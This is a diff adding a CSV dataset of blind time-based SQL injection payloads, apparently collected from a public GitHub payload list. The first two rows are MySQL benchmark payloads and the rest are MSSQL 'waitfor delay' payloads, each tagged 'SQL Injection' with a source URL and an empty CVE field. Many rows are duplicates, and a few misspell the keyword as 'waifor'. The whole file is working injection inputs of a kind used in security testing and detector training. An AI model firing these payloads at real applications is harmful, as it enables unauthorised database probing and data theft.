@@ -1,0 +1,27 @@
+cve,tag,payload,url
+,SQL Injection,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-INSERT.txt
+,SQL Injection,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MySQL/payloads-sql-blind-MySQL-INSERT.txt
+,SQL Injection,)%20waitfor%20delay%20'0:0:20'%20/*,https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,)%20waitfor%20delay%20'0:0:20'%20--,https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,)%20waitfor%20delay%20'0:0:20'%20/*,https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,)%20waitfor%20delay%20'0:0:20'%20--,https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,)%20waitfor%20delay%20'0:0:20'%20/*,https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,))%20waitfor%20delay%20'0:0:20'%20/*,https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,))%20waitfor%20delay%20'0:0:20'%20--,https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,))%20waitfor%20delay%20'0:0:20'%20/*,https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,))%20waitfor%20delay%20'0:0:20'%20--,https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,))%20waitfor%20delay%20'0:0:20'%20/*,https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,))%20waitfor%20delay%20'0:0:20'%20--,https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,",NULL)%20waitfor%20delay%20'0:0:20'%20/*",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,",NULL)%20waitfor%20delay%20'0:0:20'%20--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,",NULL)%20waifor%20delay%20'0:0:20'%20/*",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,",NULL)%20waitfor%20delay%20'0:0:20'%20--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,",NULL)%20waitfor%20delay%20'0:0:20'%20/*",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,"),NULL)%20waitfor%20delay%20'0:0:20'%20/*",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,"),NULL)%20waitfor%20delay%20'0:0:20'%20--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,"),NULL)%20waifor%20delay%20'0:0:20'%20/*",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,"),NULL)%20waitfor%20delay%20'0:0:20'%20--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,"),NULL)%20waitfor%20delay%20'0:0:20'%20/*",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,",NULL)%20waitfor%20delay%20'0:0:20'%20--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
+,SQL Injection,"),NULL)%20waitfor%20delay%20'0:0:20'%20--",https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/payloads-sql-blind/MSSQL/payloads-sql-blind-MSSQL-INSERT.txt
